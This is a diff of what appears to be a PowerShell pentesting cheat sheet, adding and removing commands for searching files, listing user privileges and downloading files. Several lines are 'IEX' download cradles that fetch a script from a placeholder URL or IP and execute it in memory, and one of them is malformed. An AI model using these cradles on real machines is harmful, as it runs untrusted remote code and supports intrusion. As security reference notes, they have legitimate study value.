@@ -567,17 +567,14 @@ Select-String -Path C:\path\here\*.extension_here -Pattern "string_here"
 # grep recursively
 Get-ChildItem C:\path\to\directory -Filter *.extension_here -Recurse | Select-String "string_here"
 
-# download file from web server
-IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')
-IWR('http://URL_here/file_here')
-
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
 
 # display user privs
 whoami /all
 
-# download file onto box
+# download file from web server
+IEX(IWR('http://URL_here/file_here'))
 IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
 IEX(New-Object Net.WebClient).downloadString('http://IP_here/path/to/file')
 
